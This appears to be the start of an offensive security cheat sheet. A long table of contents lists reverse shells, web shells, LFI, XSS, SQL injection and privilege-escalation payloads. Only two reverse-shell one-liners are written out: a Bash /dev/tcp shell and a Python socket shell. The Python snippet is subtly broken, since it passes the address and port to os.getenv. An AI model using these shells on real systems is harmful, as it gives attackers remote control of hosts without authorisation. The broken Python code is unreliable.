____

### Reverse shell
* #### [Bash](#reverse_shell_bash)
* #### [Python](#reverse_shell_python)
* #### Netcat
* #### PHP
* #### Telnet
* #### Ruby
* #### Perl
### TTY Spawn Shell
* #### Python spawn shell
* #### OS system spawn shell
* #### Bash spawn shell
* #### Perl spawn shell
* #### Python spawn shell 
* #### Lua spawn shell 
* #### IRB spawn shell 
* #### VI spawn shell 
* #### VI(2) spawn shell 
* #### Nmap spawn shell 
### PHP Reverse Shell
* #### RCE
* #### Obfuscate PHP Web Shell
* #### PHP Reverse Shell
### LFI
* #### Directory traversal
* #### PHP Wrapper php://file
* #### PHP Wrapper php://filter
* #### Useful LFI files (Linux)
* #### Useful LFI files (Apache)
* #### Useful LFI files (MySQL)
* #### Useful LFI files (Windows)
### XSS
* #### Data grabber for XSS
* #### XSS in HTML/Applications
  * ##### Basic Payload
  * ##### Img tag payload
* #### XSS in Markdown
* #### XSS in SVG
* #### Bypass word blacklist with code evaluation
### SQL Injection Payloads
* #### Generic SQL Injection
* #### Time-Based
* #### Generic Error Based Payloads
* #### Authentication Based Payloads
* #### Order by and UNION Based Payloads
### Useful Linux command
* #### SUID Commands
* #### System Version
* #### Environment Variables
* #### Service settings
* #### Cron Jobs
* #### Other Users
* #### Port Forwarding
* #### TAR wildcard cronjob privilege escalation
### File Transfer
* #### Bash Upload
* #### Bash Download
* #### Netcat
* #### Python
* #### SCP

____

### Reverse shell > <a name="reverse_shell_bash"></a>bash
bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1234 <&1'  
  
  
### Reverse shell > <a name="reverse_shell_python"></a>Python
```python  
python -c 'import sys,socket,os,pty;s=socket.socket()
  s.connect((os.getenv("127.0.0.1"),int(os.getenv("1234"))))
  [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
  pty.spawn("/bin/sh")'
```
